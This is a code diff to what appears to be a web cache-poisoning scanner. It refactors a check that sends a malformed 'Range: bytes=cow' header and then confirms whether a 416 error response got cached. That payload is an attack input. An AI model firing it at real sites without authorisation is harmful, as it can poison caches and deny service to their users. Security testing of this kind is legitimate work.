@@ -10,7 +10,10 @@ requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.
 
 def range_error_check(url):
     print("\033[36m ├ Range Header analyse\033[0m")
+    
     url = "{}?cb=123".format(url)
+    hit_verify = False
+
     header_range = {
     "Range": "bytes=cow"
     }
@@ -25,10 +28,12 @@ def range_error_check(url):
             if "Cache-Status" in rr or "X-Cache" in rr or "x-drupal-cache" in rr or "X-Proxy-Cache" in rr or "X-HS-CF-Cache-Status" in rr \
                 or "X-Vercel-Cache" in rr or "X-nananana" in rr or "x-vercel-cache" in rr or "X-TZLA-EDGE-Cache-Hit" in rr or "x-spip-cache" in rr \
                 or "x-nextjs-cache" in rr:
-                print("\033[36m --├\033[0m Range header seem's to be cached with a 416 response code")
-                req_verify = requests.get(url, verify=False, timeout=10)
-                if req_verify.status_code == 416:
-                    print("  \033[31m └── VULNERABILITY CONFIRMED\033[0m | 416 STATUS-CODE cached | \033[34m{}\033[0m | PAYLOAD: Range: bytes=cow".format(url))
+                hit_verify = True
+        if hit_verify:
+            print("\033[36m --├\033[0m Range header seem's to be cached with a 416 response code")
+            req_verify = requests.get(url, verify=False, timeout=10)
+            if req_verify.status_code == 416:
+                print("  \033[31m └── VULNERABILITY CONFIRMED\033[0m | 416 STATUS-CODE cached | \033[34m{}\033[0m | PAYLOAD: Range: bytes=cow".format(url))
     elif req_range.status_code == 202:
         print("plop 202")
 
